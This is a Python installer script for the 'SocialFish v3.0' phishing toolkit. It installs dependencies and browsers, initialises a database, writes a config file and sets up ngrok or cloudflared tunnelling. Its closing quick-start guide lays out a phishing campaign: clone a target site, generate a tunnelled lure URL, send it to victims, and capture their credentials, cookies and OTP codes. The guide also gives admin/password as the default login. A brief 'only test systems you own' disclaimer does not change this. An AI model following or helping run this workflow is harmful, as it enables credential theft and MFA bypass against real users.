#!/usr/bin/env python3
"""
SocialFish v3.0 Setup & Initialization Script
Handles dependency installation, database migration, and configuration
"""

import os
import sys
import subprocess
from pathlib import Path
import logging

logger = logging.getLogger("setup")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

def print_banner():
    logger.info("""
    ╔═══════════════════════════════════════════╗
    ║     SocialFish v3.0 Setup Wizard          ║
    ║     Modern Dynamic Phishing Toolkit       ║
    ╚═══════════════════════════════════════════╝
    """)

def check_python():
    """Verify Python 3.8+"""
    if sys.version_info < (3, 8):
        logger.error("Python 3.8+ required")
        exit(1)
    logger.info(f"Python {sys.version.split()[0]} [OK]")

def install_dependencies():
    """Install required packages"""
    logger.info("\n[*] Installing dependencies...")
    
    deps = [
        'flask==2.3.3',
        'flask-socketio>=5.3.0',
        'eventlet>=0.33.3',
        'playwright>=1.40.0',
        'pyngrok>=7.0.0',
        'python-dotenv>=1.0.0',
        'cryptography>=41.0.0',
        'selenium>=4.13.0',
        'webdriver-manager>=4.0.0'
    ]
    
    for dep in deps:
        try:
            __import__(dep.split('>=')[0].split('==')[0].replace('-', '_'))
            logger.info(f"[+] {dep.split('>=')[0]} already installed")
        except ImportError:
            logger.info(f"[*] Installing {dep}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
    
    logger.info("[+] All dependencies installed [OK]")

def install_playwright_browsers():
    """Install Playwright browsers"""
    logger.info("\n[*] Installing Playwright browsers...")
    logger.info("    (This may take a few minutes)")
    
    try:
        from playwright.sync_api import sync_playwright
        subprocess.run([sys.executable, '-m', 'playwright', 'install', 'chromium'], check=True)
        logger.info("[+] Chromium browser installed [OK]")
    except Exception as e:
        logger.exception("Failed to install Playwright browsers: %s", e)
        logger.warning("You can manually run: playwright install chromium")

def initialize_database():
    """Initialize database schema"""
    logger.info("\n[*] Initializing database...")
    
    try:
        # Import after dependencies are installed
        import sys
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        
        try:
            from core.db_migration import migrate_db
        except ImportError as ie:
            logger.warning(f"Could not import db_migration: {ie}")
            logger.info("Using fallback database initialization...")
            # Fallback: create basic database
            import sqlite3
            db_path = os.getenv("DATABASE", "./database.db")
            conn = sqlite3.connect(db_path)
            conn.close()
            logger.info(f"[+] Basic database created: {db_path} [OK]")
            return True
        
        db_path = os.getenv("DATABASE", "./database.db")
        migrate_db(db_path)
        logger.info(f"[+] Database initialized: {db_path} [OK]")
    except Exception as e:
        logger.warning(f"Database initialization warning: {e}")
        logger.warning("Database will be initialized on first run")
        return True  # Don't fail setup if DB init has issues
    
    return True

def setup_tunneling():
    """Interactive tunnel setup"""
    logger.info("\n[*] Tunnel Setup (Optional)")
    logger.info("You can setup tunneling now or skip for local testing.")
    
    try:
        choice = input("\nSetup tunneling? (ngrok/cloudflared/skip) [skip]: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        logger.info("Skipping tunnel setup (non-interactive mode)")
        return
    
    if choice in ['ngrok', 'cloudflared']:
        try:
            from core.tunnel_manager import TunnelManager
            manager = TunnelManager()
            
            # Check if interactive_setup method exists
            if hasattr(manager, 'interactive_setup') and callable(getattr(manager, 'interactive_setup')):
                manager.interactive_setup()
            else:
                logger.warning("TunnelManager.interactive_setup() not available")
                logger.warning("You can setup tunneling manually with:")
                logger.warning("    python core/tunnel_manager.py setup")
            
            logger.info("[+] Tunnel configured [OK]")
        except Exception as e:
            logger.warning(f"Tunnel setup failed: {e}")
            logger.warning("You can setup tunneling manually later.")
    else:
        logger.info("Tunnel setup skipped. You can configure later with:")
        logger.info("    python -m core.tunnel_manager")

def generate_config():
    """Create .env file if needed"""
    env_file = Path(".env")
    if not env_file.exists():
        logger.info("\n[*] Creating .env configuration...")
        # Generate random secret key
        import secrets
        secret_key = secrets.token_hex(32)
        
        env_content = f"""# SocialFish v3.0 Configuration
DATABASE=./database.db
FLASK_ENV=production
FLASK_DEBUG=0
SECRET_KEY={secret_key}

# Tunneling
NGROK_TOKEN=
CLOUDFLARED_TOKEN=

# Webhook
WEBHOOK_TIMEOUT=5
WEBHOOK_MAX_RETRIES=3
"""
        env_file.write_text(env_content)
        logger.info("[+] .env file created (configure as needed) [OK]")
    else:
        logger.info("[+] .env file already exists")

def print_next_steps():
    """Print quick-start guide"""
    logger.info("""
╔═══════════════════════════════════════════╗
║        Setup Complete! Next Steps:        ║
╚═══════════════════════════════════════════╝

1. Start the application:
   python SocialFish.py admin password

2. Access the web interface:
   http://localhost:5000/neptune
   
   Username: admin
   Password: password

3. Create your first template:
   - Go to /templates
   - Click "New Template"
   - Enter target URL
   - Choose cloning options
   - System will record the flow

4. Generate a lure URL:
   - Select template
   - Click "Lure" → "Tunnel"
   - Choose tunneling method
   - Copy generated URL

5. Send to victims:
   - Distribute lure URL
   - Monitor sessions in real-time
   - Capture credentials, cookies, OTP codes

For detailed documentation, see: FEATURES_v3.md

⚠️ Remember: Only test systems you own or have explicit permission to test.

    """)

def main():
    print_banner()
    check_python()
    
    try:
        install_dependencies()
        install_playwright_browsers()
        initialize_database()
        generate_config()
        setup_tunneling()
        print_next_steps()
    except KeyboardInterrupt:
        logger.warning("\nSetup cancelled by user")
        exit(0)
    except Exception as e:
        logger.exception("Setup error: %s", e)
        logger.warning("\n⚠️  Setup encountered an error but may still be usable.")
        logger.warning("Try running: python SocialFish.py admin password")
        exit(0)  # Don't exit with error code as partial setup might work


if __name__ == '__main__':
    main()
